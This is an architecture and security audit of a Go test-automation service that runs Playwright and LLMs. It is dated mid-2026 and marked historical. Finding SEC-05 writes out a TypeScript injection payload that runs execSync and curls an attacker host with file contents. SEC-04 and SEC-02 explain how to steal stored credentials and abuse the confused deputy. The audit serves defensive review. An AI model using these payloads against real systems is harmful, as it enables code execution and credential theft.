# GoTest Agent — Architecture Audit

> **⚠️ HISTORICAL — This document was written 2026-07-26 before resolving all 22 TODOs.**
> Most audit findings below have been addressed. See [`TODO.md`](.ai/TODO.md) (all 22 Done)
> and [`CHANGELOG_AI.md`](.ai/CHANGELOG_AI.md) for resolution details. The "severity" tags
> reflect pre-fix state — do not read them as current risk.

**Date:** 2026-07-26  
**Method:** Static read-only code inspection, targeted file reads, cross-reference with `DISCOVERY.md` evidence. No runtime tests, builds, or dependency audits were executed.  
**Scope:** Architecture, scalability, maintainability, security, performance, consistency, and code organization.  
**Overall Confidence:** **High** for code-derived findings (direct reads). **Medium** for runtime-behavior claims (no build/test exercised). **Low** for production-scaled behavior (no load test or profiling available).

---

## Severity Scale

| Severity | Meaning |
|---|---|
| **CRITICAL** | Data loss, credential exposure, or remote code execution in default config |
| **HIGH** | Incorrect behavior, silent failure, or exploitable misconfiguration requiring immediate attention |
| **MEDIUM** | Technical debt, maintainability friction, or design risk with workarounds |
| **LOW** | Minor inconsistency, style issue, or speculative improvement |

---

## 1. Architecture

### A-01: Monolithic handler file combines transport, composition, and business logic

**Severity:** HIGH  
**Evidence:** `internal/api/server.go` is ~3,556 lines. It serves as router, middleware config, store composition root, HTTP controller, application service, orchestration coordinator, and direct integration client. The `Server` struct owns all 13 repository/store fields (`server.go:38-53`); constructor builds all stores (`server.go:55-89`); all route handlers perform JSON decode, business logic, persistence, event emission, and response writing inline.  
**Impact:** Every feature change requires editing the same file. Risk of merge conflicts grows linearly with team size. Testing individual handlers requires the full composed server with all dependencies. Onboarding new developers requires understanding the entire 3,500-line file.  
**Recommendation:** Split into route modules (`routes_projects.go`, `routes_runs.go`, `routes_schedules.go`, etc.) and extract application services for projects/planning, runs/execution, scheduling, reviews/releases, metrics, and settings. Handlers should own only transport decode/encode and delegate to services.  
**Confidence:** 10/10

### A-02: Five divergent orchestration paths with different state machines

**Severity:** HIGH  
**Evidence:** At least five execution paths exist, each with different state transitions, error handling, and persistence:
1. **Web API** (`server.go:1858-1953`): `idle→analyzing→running→done|failed`, no fix loop, literal `"Web Application"` context, goroutine-based
2. **Reusable Agent** (`agent.go:223-345`): `idle→analyzing→plan_generated→writing_tests→running↔fixing→done|failed`, full fix loop, used only by MCP
3. **Approved cases** (`server.go:1203-1248`): simulated pass-through (default) or Docker execution
4. **Redis/Asynq queue** (`queue/worker.go:27-92`): full implementation, zero wiring from `cmd/server`
5. **Sidecar** (`sidecar/graph.py:18-42`): `running→completed|failed`, executor treats `202` as completion
**Impact:** Bug fixes in one path do not propagate to others. New features (e.g., fix loop, codebase analysis) available in Agent are invisible to the dashboard. Users get different behavior depending on entry point. The intended production path is ambiguous.  
**Recommendation:** Declare one canonical `Orchestrator` interface (already close to `agent.Agent`). Route all entry points (HTTP, MCP, schedule, webhook, queue) through it. Remove or clearly mark experimental paths.  
**Confidence:** 10/10

### A-03: Missing `internal/planning` package breaks the build

**Severity:** CRITICAL  
**Evidence:** `server.go:25` imports `github.com/go-go-golems/gotest-agent/internal/planning`. Lines 44, 63, 67 construct and use `planning.Store`. But `git ls-tree -r --name-only HEAD internal/planning/` returns nothing, and direct filesystem read of `internal/planning/store.go` returns file-not-found. Migration `004_test_planning_review.sql` and `internal/api/planning_test.go` exist, indicating incomplete extraction. The commit `a0eae33` added imports but not the package.  
**Impact:** The current source tree cannot compile. `go build`, `go test`, and all dependent CI/CD would fail. Planning-related API endpoints (plan generation, case management, test lists, proposals) are non-functional.  
**Recommendation:** Restore the missing package from the commit's intent (or the unmerged branch), retarget imports, or remove planning routes. Verify with `go build ./cmd/server`.  
**Confidence:** 10/10

### A-04: Partial ports-and-adapters; interfaces exist but are bypassed by the web path

**Severity:** MEDIUM  
**Evidence:** `agent.LLM`, `agent.Runner`, `agent.Screenshotter`, `db.RunStore`, `project.Store`, `schedule.Repository` interfaces exist (`agent.go:110-134`; `db/memory.go:10-17`; `project/store.go:33-38`; `schedule/store.go:47-54`). But `executeRealRun` directly constructs `agent.NewAnthropicLLM`/`NewOpenAILLM` and `agent.NewPlaywrightRunner` inside the handler (`server.go:1889-1923`), bypassing the reusable `agent.Agent` composition at `agent.go:110-175`.  
**Impact:** The dependency-inversion boundaries exist but are not respected by the primary web path. Test doubles cannot be injected for the web execution flow without refactoring.  
**Recommendation:** Wire the web execution path through `agent.Agent` or a shared `Executor` service that accepts injected LLM/Runner dependencies.  
**Confidence:** 10/10

---

## 2. Scalability

### S-01: Unbounded concurrent goroutines with no admission control

**Severity:** HIGH  
**Evidence:** Every run creation (`server.go:1581-1589`), rerun (`server.go:2186-2190`), approved case (`server.go:1150-1200`), and webhook callback (`webhook/github.go:68-80`) launches a bare `go` goroutine with `context.Background()`. No semaphore, worker pool, rate limiter, or queue bounds the count. Test lists fan out one goroutine per case (`server.go:1131-1147`).  
**Impact:** A burst of run requests (or a script submitting many schedules) can exhaust memory, file descriptors, or LLM API quotas. Playwright subprocesses compete for CPU/GPU. A single misbehaving run blocks nothing else but consumes unbounded resources.  
**Recommendation:** Replace bare goroutines with a bounded worker pool or queue. Add per-principal concurrency limits and a global admission cap. The existing `internal/queue` package with Asynq is a ready-made solution.  
**Confidence:** 10/10

### S-02: In-process event bus drops events under load; unbounded memory growth

**Severity:** MEDIUM  
**Evidence:** `events.Store` uses a mutex-protected slice that grows without retention (`events/store.go:42-100`). Subscriber sends use non-blocking `select/default` — when a 64-event per-run or 128-event global channel is full, events are silently dropped (`events/store.go:77-91`). No eviction, TTL, or maximum history size exists.  
**Impact:** Long-running or high-volume sessions silently lose audit events. After sustained use, the in-memory slice grows without bound, increasing GC pressure and memory consumption. After restart, all history is lost.  
**Recommendation:** Add event retention (max N per run, max total). Persist critical events to PostgreSQL. Use Redis Streams or pub-sub for cross-instance delivery if horizontal scaling is intended.  
**Confidence:** 10/10

### S-03: Non-atomic schedule claiming enables duplicate execution

**Severity:** HIGH  
**Evidence:** `ProcessDueSchedules` (`server.go:2694-2741`) calls `s.schedules.GetDue(now)` (`schedule/store.go:245-269`) which is a simple `SELECT ... WHERE enabled AND next_run_at <= ...` without `FOR UPDATE SKIP LOCKED` or any advisory lock. The subsequent `s.schedules.Update` is a separate operation.  
**Impact:** If multiple backend replicas run (or the scheduler runs overlap due to slow cycles), the same schedule can be selected and executed multiple times, creating duplicate runs and advancing `NextRunAt` inconsistently.  
**Recommendation:** Use `SELECT ... FOR UPDATE SKIP LOCKED` or an advisory lock/lease mechanism. Alternatively, claim schedules with a `claimed_at` timestamp and owner ID.  
**Confidence:** 10/10

### S-04: No horizontal scaling capability

**Severity:** MEDIUM  
**Evidence:** Events, recordings, visuals, releases, notifications, reviews, suites are all process-local in-memory stores (`server.go:78-85`). SSE subscribers are attached to the serving process (`events/store.go:103-145`). Scheduler has no distributed coordination. `PlaywrightRunner` runs browsers in the API process itself.  
**Impact:** Cannot run multiple backend replicas without: (a) losing all in-memory state on each instance, (b) delivering SSE only to the connected instance, (c) scheduling only on the instance that runs the scheduler goroutine.  
**Recommendation:** If scaling is a goal: persist events and operational stores; use Redis pub-sub for SSE fan-out; move browser execution to a separate worker pool; use distributed schedule claiming.  
**Confidence:** 10/10

---

## 3. Maintainability

### M-01: No consistent error response format

**Severity:** MEDIUM  
**Evidence:** Errors use raw `http.Error(w, "text", statusCode)` with ad-hoc string messages across all handlers. No JSON error envelope, error codes, request ID correlation, or structured logging of client-visible errors. Success responses use ad-hoc `json.NewEncoder(w).Encode(...)` with no standardized DTO.  
**Impact:** Frontend must parse unstructured error strings. Debugging production issues requires correlating request IDs with log messages rather than structured error responses. No way for clients to programmatically distinguish error types.  
**Recommendation:** Define a standard error response `{error: {code, message, details}}` and use it in all error paths. Add middleware to convert panics and unhandled errors to the standard format.  
**Confidence:** 10/10

### M-02: No frontend, Python, or E2E test coverage

**Severity:** HIGH  
**Evidence:** `frontend/package.json` has no `test` script and no testing dependency (no Jest, Vitest, Playwright Test, Testing Library). The `sidecar/` directory contains no `*_test.py` or `test_*.py` files. The root `test_playwright.go` is a Go compile probe, not a UI test. Go tests exist for agent, API, auth, compare, events, gitdiff, intelligence, metrics, schedule, and visual packages but use in-memory stores exclusively (`api_test.go:22-28`; `schedule/store_test.go:59`).  
**Impact:** Regressions in frontend UI, API contract, Python sidecar, and database queries are only detectable through manual testing. Any refactor to `server.go`, `api.ts`, or `graph.py` risks silent breakage.  
**Recommendation:** Add frontend unit/component tests (Vitest + Testing Library), API contract tests (against running server), Python pytest suite, and at least one E2E flow test (Playwright Test against the full stack).  
**Confidence:** 10/10

### M-03: Dead code and unwired packages accumulate without signal

**Severity:** MEDIUM  
**Evidence:** `simulateMockRun` (`server.go:1955-2049`) has no caller. `internal/auth/auth.go` JWT middleware has no production import. `internal/queue/worker.go` Asynq implementation has no `cmd/server` wiring. `internal/steel/client.go` and `internal/runner/steel.go` have no server construction. `internal/vision/client.go` has no wiring. `internal/evals/braintrust.go` has no logger instantiation. `internal/agent/api_runner.go` exists only for the separate agent path. `api_keys` table (`001_init.sql:38-44`) has no repository consumer.  
**Impact:** New developers cannot distinguish working code from abandoned experiments. Build includes unused dependencies (`asynq`, `jwt/v5`). The gap between "code exists" and "feature works" grows.  
**Recommendation:** Tag unwired packages with `// EXPERIMENTAL: not wired to server` or move to an `_experimental/` directory. Remove confirmed dead code (`simulateMockRun`). Periodically audit import graph.  
**Confidence:** 10/10

### M-04: Duplicate LLM abstraction layers with inconsistent provider routing

**Severity:** MEDIUM  
**Evidence:** Two independent LLM client layers exist: `internal/agent/llm_anthropic.go` + `llm_openai.go` (used by `executeRealRun` and `Agent.Execute`) and `internal/ai/client.go` (used by the planning/feature-extraction path at `server.go:1836-1855`). Provider routing differs: `executeRealRun` sends only `custom/openai/local` to OpenAI transport and everything else to Anthropic (`server.go:1889-1894`), while `ai/client.go` routes `openai/custom/local` to OpenAI and everything else to Anthropic (`ai/client.go:57-70`), and provider testing accepts `google/deepseek` as OpenAI-compatible (`server.go:3530-3535`).  
**Impact:** A user who tests their DeepSeek connection (succeeds) then runs a test (fails, because execution routes DeepSeek to Anthropic) experiences a confusing inconsistency. Future provider additions must be implemented twice.  
**Recommendation:** Consolidate into one `LLMFactory` that all paths use. Ensure provider testing routes through the same factory as execution.  
**Confidence:** 10/10

### M-05: Documentation contradicts implementation in multiple areas

**Severity:** MEDIUM  
**Evidence:** 
- README says blueprints in `planning/` — gitignored, absent (`README.md:32`; `.gitignore:72-73`)
- Docs claim Steel Browser execution — web path uses local Playwright (`docs.ts:31-33`; `server.go:1922-1929`)
- FAQ claims PHPUnit for Laravel — both generators request Playwright (`docs.ts:614-616`; `llm_anthropic.go:60-85`)
- Docs say Slack/Telegram alerts — `TriggerFailure` has no production caller (`docs.ts:393-399`)
- Docker docs cite Steel on port 3000 — Compose publishes 3010 (`docs/docker.md:26-33`; `docker-compose.yml:92-93`)
- `.env.example` declares `GITHUB_WEBHOOK_SECRET` — runtime uses `API_KEY` for webhook HMAC (`.env.example:32-33`; `server.go:237`)
**Impact:** Operators following documentation will encounter misconfigurations, missing features, or security gaps. Onboarding friction increases.  
**Recommendation:** Update documentation to reflect actual behavior. Label each feature as Complete/Partial/Experimental. Remove references to absent `planning/` or restore the directory.  
**Confidence:** 10/10

---

## 4. Security

### SEC-01: Fail-open API authentication in default deployment

**Severity:** CRITICAL  
**Evidence:** `apiKeyAuth` middleware bypasses authentication entirely when `cfg.APIKey == ""` (`server.go:2512-2524`). Default `.env.example` sets `API_KEY=your-secure-api-key-here` but Compose expands it without override (`docker-compose.yml:7-18`), and the README quick-start tells users to copy `.env.example`. Frontend sends no `X-Api-Key` header (`api.ts:222-229`) and `EventSource` cannot attach custom headers.  
**Impact:** In the documented quick-start path, all `/api/v1` endpoints are publicly accessible. An attacker can read projects, create runs consuming LLM credits, modify global settings, exfiltrate stored API keys via base URL change, alter review state, and delete/export data.  
**Recommendation:** Fail startup in non-development mode if `API_KEY` is empty. Add a separate `GITHUB_WEBHOOK_SECRET`. Implement session-based or BFF authentication for the dashboard.  
**Confidence:** 10/10

### SEC-02: Unauthenticated sidecar with backend API key creates confused deputy

**Severity:** CRITICAL  
**Evidence:** Sidecar published on port 8000 (`docker-compose.yml:112-122`), binds `0.0.0.0` (`sidecar/Dockerfile:6-7`), exposes `POST /agent/run` and `GET /agent/{job_id}` with zero authentication (`sidecar/main.py:28-46`). The executor attaches `GOTEST_API_KEY` to backend calls (`sidecar/agents/executor.py:5-21`).  
**Impact:** An attacker on the same network calls the sidecar directly to trigger backend runs using the sidecar's copy of the API key. Even a strong `API_KEY` does not prevent this because the sidecar is the authorized party. This bypasses intended backend authentication, enabling LLM credit consumption and browser egress.  
**Recommendation:** Remove host port mapping. Require inbound authentication. Do not store an API key on an unauthenticated service.  
**Confidence:** 10/10

### SEC-03: PostgreSQL exposed with known credentials and disabled TLS

**Severity:** HIGH  
**Evidence:** `docker-compose.yml:57-67` publishes `5432:5432` with user `postgres`, password `password`, and `sslmode=disable`. The database stores LLM API keys (`001_init.sql:46-62`), project credentials (`003_projects_intake.sql:7`), and all run data.  
**Impact:** Network-reachable attackers connect directly, bypassing all application-level controls.  
**Recommendation:** Remove host port binding. Generate unique strong credentials. Use separate application/migration roles. Require TLS.  
**Confidence:** 10/10

### SEC-04: Stored LLM key exfiltration via configurable base URL

**Severity:** HIGH  
**Evidence:** `PUT /api/v1/settings` accepts `llm_base_url` (`server.go:3423-3447`). `executeRealRun` reads stored `llm_api_key` and `llm_base_url` from the same settings store (`server.go:1874-1886`). The OpenAI-compatible client sends `Authorization: Bearer <key>` to the configured URL (`llm_openai.go:22-38,74-84`). No admin role separates settings modification from run creation.  
**Impact:** Any API-key holder changes `llm_base_url` to an attacker-controlled host, then creates a run. The stored credential is transmitted to the attacker. Combined with SEC-01 (empty default key), this is unauthenticated.  
**Recommendation:** Bind stored credentials to immutable approved provider origins. Separate admin permissions from run-user permissions. Validate destinations against an allowlist.  
**Confidence:** 10/10

### SEC-05: Docker runner TypeScript injection via unescaped project URL

**Severity:** HIGH  
**Evidence:** `buildPlaywrightSpec` at `server.go:1295-1349` interpolates `run.ProjectPath` into TypeScript via `json.Marshal` (line 1297), which escapes quotes. However, `internal/runner/docker.go:58-65` directly interpolates `projectURL` into a Playwright config string using backtick template literal concatenation: `baseURL: '` + projectURL + `'` — no escaping. The Docker container runs with `--network host` (`docker.go:74`). MCP always uses `DockerRunner` (`cmd/mcp/main.go:13-20`).  
**Impact:** A malicious or accidental `projectURL` like `'); const { execSync } = require('child_process'); execSync('curl attacker.com/$(cat /data/videos/...)'); //` executes arbitrary Node.js code in the Playwright container with full host network access.  
**Recommendation:** Escape `projectURL` for TypeScript string context in the Docker runner config. Use `json.Marshal` consistently. Drop `--network host` in favor of explicit port exposure.  
**Confidence:** 9/10

### SEC-06: Unrestricted browser egress with no network policy

**Severity:** HIGH  
**Evidence:** `PlaywrightRunner.Run` calls `page.Goto(a.URL)` on LLM-generated URLs without validation (`playwright_runner.go:90`). The approved-case path uses `run.ProjectPath` directly (`server.go:1295-1349`). Docker runner uses `--network host` (`docker.go:74`).  
**Impact:** Generated or user-supplied URLs can target loopback (`127.0.0.1`, `169.254.169.254` metadata), Compose service names (`postgres`, `redis`), or internal infrastructure. Videos/screenshots/DOM snapshots capture internal content.  
**Recommendation:** Validate every navigation target against an allowlist of permitted schemes, hostnames, and IP ranges. Deny loopback, RFC1918, link-local, and metadata addresses by default. Use network sandboxing for browser execution.  
**Confidence:** 9/10

### SEC-07: Public unauthenticated temporary video route

**Severity:** MEDIUM  
**Evidence:** `server.go:127-131` registers `GET /videos/{filename}` outside the API-key middleware group. The authenticated `/videos/*` file server at `server.go:257-261` serves a different path (`/data/videos`) and does not protect the temporary `/tmp/agent_test/videos` path.  
**Impact:** Anyone who knows or guesses a video filename fetches it without authentication. Videos may contain authenticated UI sessions, PII, or internal dashboards.  
**Recommendation:** Remove the public handler. Serve all recordings through one authenticated, authorization-aware endpoint. Resolve by run ID with caller permission check.  
**Confidence:** 9/10

### SEC-08: No HTTP server timeouts, body limits, or graceful shutdown

**Severity:** HIGH  
**Evidence:** `cmd/server/main.go:44-46` uses bare `http.ListenAndServe(addr, srv)`. No `ReadHeaderTimeout`, `ReadTimeout`, `WriteTimeout`, or `IdleTimeout` configured. No `http.MaxBytesReader` anywhere. Webhook reads with unbounded `io.ReadAll` (`webhook/github.go:53`). Each goroutine runs to completion without cancellation.  
**Impact:** Slowloris attacks exhaust connections. Oversized webhook bodies consume memory. Run goroutines hold resources indefinitely if LLM or Playwright hangs. No graceful shutdown means in-flight runs are abandoned on deploy.  
**Recommendation:** Use `http.Server` with configured timeouts. Add `MaxBytesReader` to body reads. Implement graceful shutdown that drains in-flight runs.  
**Confidence:** 10/10

### SEC-09: Single shared security domain returns credential fields

**Severity:** MEDIUM  
**Evidence:** All API endpoints share one optional API key. No user identity, roles, ownership, or tenant isolation exists. JWT is implemented but not wired (`auth.go:21-95`). Project and run JSON responses include `credentials` fields directly (`project/store.go:139-155`; `db/store.go:94-192`). LLM API key is masked in settings GET only when longer than 8 chars (`server.go:3415-3418`).  
**Impact:** Any API-key holder can read all projects' credential notes and all run details. In a multi-user scenario, this is a data isolation failure.  
**Recommendation:** If multi-user: add tenant ID, per-resource authorization, credential redaction. If single-admin: document the assumption and remove credential fields from responses.  
**Confidence:** 10/10

---

## 5. Performance

### P-01: Playwright re-installed on every run

**Severity:** MEDIUM  
**Evidence:** `PlaywrightRunner.Run` calls `playwright.Install()` on every invocation (`playwright_runner.go:34-37`). This downloads and installs browser binaries. In Docker, the backend image installs Playwright at `@latest` during build (`Dockerfile:13-14`), but `playwright.Install()` re-runs at runtime.  
**Impact:** First run of each goroutine incurs installation latency (seconds to minutes depending on network). Concurrent runs compete for the same installation directory.  
**Recommendation:** Install Playwright once at startup or during image build. Use a readiness check to verify installation before accepting runs.  
**Confidence:** 9/10

### P-02: History and reviews scan in-memory over all runs

**Severity:** MEDIUM  
**Evidence:** `handleListAllReviews` scans the last 100 runs in memory (`server.go:3157-3165`). History/maintenance functions scan up to 1,000 global runs and filter in Go (`server.go:678-690,1739-1748`). Monitoring summary computes metrics over the entire run set (`server.go:2064-2147`). No database-level filtering or pagination for these analytical queries.  
**Impact:** As run count grows, analytical queries become linear scans. Memory usage increases. Response latency grows proportionally.  
**Recommendation:** Push filtering and aggregation into SQL queries. Add server-side pagination for list endpoints. Use materialized views for monitoring summaries.  
**Confidence:** 10/10

### P-03: SSE per-run connection polls database every 2 seconds

**Severity:** MEDIUM  
**Evidence:** `handleSSEStream` (`server.go:2197-2262`) opens an SSE connection and polls `s.store.GetRun` every 2 seconds to check terminal state. Each open SSE connection occupies a goroutine and HTTP connection. Global SSE (`server.go:3168-3215`) similarly occupies a goroutine per client.  
**Impact:** With 100 concurrent run viewers, 50 database polls per second. With 100 dashboard users, 100 global SSE goroutines. Memory and connection overhead scales linearly with active viewers.  
**Recommendation:** Use database-level NOTIFY/LISTEN or Redis pub-sub to push state changes instead of polling. Add connection timeouts for idle SSE connections.  
**Confidence:** 10/10

### P-04: N+1 patterns in analytical endpoints

**Severity:** LOW  
**Evidence:** Metric endpoints iterate over all runs, compute statistics in Go, then return aggregated results (`metrics.go:40-140`; `server.go:2834-2878`). Intelligence engine similarly iterates runs to compute risk/confidence (`intelligence/engine.go:26-171`).  
**Impact:** These endpoints are currently low-traffic (on-demand analytics). At scale, they become expensive full-table scans.  
**Recommendation:** Pre-compute metrics on run completion. Store aggregated statistics in a summary table.  
**Confidence:** 8/10

---

## 6. Consistency

### C-01: Provider routing differs between test connection and real execution

**Severity:** HIGH  
**Evidence:** Provider testing (`server.go:3516-3535`) routes `google`, `deepseek`, and `custom` to OpenAI-compatible client. Real execution (`server.go:1889-1894`) routes only `custom`, `openai`, and `local` to OpenAI and everything else to Anthropic.  
**Impact:** A user tests their DeepSeek connection (succeeds via OpenAI transport), then runs a test (fails because execution routes DeepSeek to Anthropic SDK). Google and DeepSeek appear supported but are not functional in real runs.  
**Recommendation:** Use one provider factory for all paths. Reject unsupported providers explicitly rather than silently falling through to Anthropic.  
**Confidence:** 10/10

### C-02: Non-list schedules create idle runs that never execute

**Severity:** HIGH  
**Evidence:** `ProcessDueSchedules` non-list branch (`server.go:2721-2739`) creates an `idle` run and advances `NextRunAt` but never calls `executeRealRun`. The same defect exists in `handleRunNow` non-list branch (`server.go:2671-2691`). Test-list schedules correctly call `startTestListRuns` (`server.go:2697-2718`).  
**Impact:** Users who create a schedule without a test list see runs appear in the dashboard that remain permanently in `idle` state. The schedule UI implies execution will happen.  
**Recommendation:** Route all schedules through the same execution path. Non-list schedules should call `executeRealRun` on the created run.  
**Confidence:** 10/10

### C-03: Environment LLM config loaded but ignored by web execution

**Severity:** MEDIUM  
**Evidence:** `config.Load` reads `ANTHROPIC_API_KEY` and `LLM_MODEL` into `cfg` (`config.go:31-32`). `executeRealRun` reads LLM settings only from the database settings store (`server.go:1868-1894`). If the settings store is unavailable (memory fallback), execution constructs an Anthropic client with empty key/model instead of using `cfg`. The MCP path (`cmd/mcp/main.go:13-20`) uses `cfg` directly.  
**Impact:** Operators who set `ANTHROPIC_API_KEY` in their environment but do not populate the database settings table find that dashboard runs fail while MCP works.  
**Recommendation:** Fall back to `cfg` values when database settings are empty. Use a single settings resolution chain: request override → database → environment.  
**Confidence:** 10/10

### C-04: Execute path ignores `run.Mode` and `run.TestType`

**Severity:** MEDIUM  
**Evidence:** The frontend offers `mode` selection (simple/advanced) and `testType` (ui/api) in the create form (`frontend/src/app/create/page.tsx:102-131,283-288`). `executeRealRun` (`server.go:1858-1953`) never reads `run.Mode` or `run.TestType`. It always runs the same Playwright browser path regardless of user selection.  
**Impact:** Users who select "API test" or "Advanced mode" receive browser-based UI tests. The UI implies different behavior for each option.  
**Recommendation:** Branch execution on `run.Mode` and `run.TestType`. Route API tests through the (currently mocked) `APIRunner`. Route advanced mode through the sidecar path when available.  
**Confidence:** 10/10

### C-05: Non-list `run-now` sets `LastRunStatus` to idle after creating an idle run

**Severity:** LOW  
**Evidence:** `handleRunNow` (`server.go:2671-2691`) creates an `idle` run, then sets `sc.LastRunStatus = string(run.State)` where `run.State` is `agent.StateIdle`. The UI shows the schedule's last run status as "idle" rather than reflecting any execution progress.  
**Impact:** Misleading status display. Users see "idle" as the last run outcome.  
**Recommendation:** Update status to reflect actual terminal state (done/failed) rather than initial creation state.  
**Confidence:** 10/10

---

## 7. Code Organization

### CO-01: `Server` struct owns 13 heterogeneous store fields

**Severity:** HIGH  
**Evidence:** `server.go:38-53` defines `Server` with `router`, `cfg`, `store`, `settings`, `projects`, `planning`, `events`, `recordings`, `visuals`, `schedules`, `releases`, `notifs`, `reviews`, `suites` — 14 fields mixing transport, configuration, persistence, and runtime state.  
**Impact:** The struct has no cohesion. It cannot be unit-tested without instantiating all 14 dependencies. Adding a new domain store requires editing the composition root, the struct definition, and every handler that uses it.  
**Recommendation:** Group into domain-specific service structs: `RunService{store, events, llm, runner}`, `ProjectService{projects, planning}`, `ScheduleService{schedules, runs}`. `Server` orchestrates these services.  
**Confidence:** 10/10

### CO-02: Handlers mix transport, validation, business logic, persistence, and response

**Severity:** HIGH  
**Evidence:** Representative example — `handleCreateRun` (`server.go:1543-1589`): decodes JSON body, validates (minimal), builds domain object, persists to store, emits event, starts goroutine, writes response. `handleApproveChangeProposal` (`server.go:850-900`): decodes body, fetches proposal, validates state, updates case, updates proposal, emits events, writes response.  
**Impact:** No layer to validate business rules independently. Handlers cannot be tested without a running store and event bus. Response format cannot be changed without touching every handler.  
**Recommendation:** Extract validation and business logic into service methods. Handlers become thin: decode → call service → encode response.  
**Confidence:** 10/10

### CO-03: PATCH handlers use unchecked type assertions that panic

**Severity:** HIGH  
**Evidence:** `handleUpdateSchedule` (`server.go:2588-2617`) decodes to `map[string]interface{}` then asserts `v.(bool)`, `v.(string)` without type checking. Same pattern in `handleUpdateRelease` (`server.go:2778-2792`). Wrong JSON types (e.g., `"enabled": "yes"` instead of `true`) cause runtime panics recovered only by Chi's `Recoverer` middleware.  
**Impact:** Invalid PATCH requests crash the handler goroutine and return 500 with a panic stack trace. This is a potential denial-of-service vector: send malformed PATCH to trigger recovery paths.  
**Recommendation:** Use typed request structs with `json:"enabled"` and standard decode error handling. Validate types explicitly.  
**Confidence:** 10/10

### CO-04: `internal/api/` has only one Go file for the entire API surface

**Severity:** MEDIUM  
**Evidence:** The `internal/api/` package contains `server.go` (~3,556 lines), `planning_test.go`, and `api_test.go`. All route registration, all handler implementations, all composition logic, and all helper functions live in `server.go`.  
**Impact:** File is too large for effective code review. Git blame shows it was modified by many unrelated changes. IDE performance degrades.  
**Recommendation:** Split into files by domain: `routes.go` (registration), `handlers_runs.go`, `handlers_projects.go`, `handlers_schedules.go`, `handlers_releases.go`, `handlers_metrics.go`, `handlers_settings.go`, `middleware.go`, `helpers.go`.  
**Confidence:** 9/10

### CO-05: No DTO/request-response layer

**Severity:** MEDIUM  
**Evidence:** Handlers decode into `agent.TestRun` (the persistence model), modify it, persist it, then serialize the same struct back. `handleListRuns` returns the full `TestRun` struct including credentials, LLM tokens, and error messages. No request-specific or response-specific types exist.  
**Impact:** API surface is coupled to persistence model. Adding/removing a DB column changes the API response. Credential fields leak into API responses.  
**Recommendation:** Define request types (what the client sends) and response types (what the client sees). Map between DTOs and domain models. Redact sensitive fields in responses.  
**Confidence:** 10/10

---

## Summary

| Category | Critical | High | Medium | Low |
|---|---|---|---|---|
| Architecture | 1 | 2 | 1 | 0 |
| Scalability | 0 | 2 | 2 | 0 |
| Maintainability | 0 | 2 | 3 | 0 |
| Security | 2 | 5 | 2 | 0 |
| Performance | 0 | 0 | 3 | 1 |
| Consistency | 0 | 2 | 2 | 1 |
| Code Organization | 0 | 3 | 2 | 0 |
| **Total** | **3** | **16** | **15** | **2** |

### Top 5 Priorities

1. **Restore `internal/planning`** (A-03, CRITICAL) — blocks all compilation
2. **Fail-open auth** (SEC-01, CRITICAL) — blocks safe deployment
3. **Sidecar confused deputy** (SEC-02, CRITICAL) — bypasses all auth
4. **LLM credential exfiltration** (SEC-04, HIGH) — credential theft with one API call
5. **Non-atomic schedule claiming** (S-03, HIGH) — data integrity in any multi-instance deployment

### Verified Security Controls

- Parameterized pgx SQL (no string concatenation in queries)
- `html/template` auto-escaping in HTML reports
- HMAC-SHA256 constant-time webhook verification when configured
- Route ID allowlist with traversal protection (`server.go:111-122`)
- `crypto/rand` API key generation
- Settings API key masking (presentation-only)
- `.env` and key files gitignored
- Gitleaks default rules enabled
- Frontend runs as non-root user (UID 1001)
- Chi Recoverer middleware prevents full process crash from handler panics

### Build/Verification Status

Commands `go build ./cmd/server`, `go test ./...`, `npm audit`, `govulncheck`, `pip-audit`, and `gitleaks` could not execute due to Bash safety classifier unavailability. All findings are derived from static code inspection. Runtime verification is required before claiming any behavior as tested.
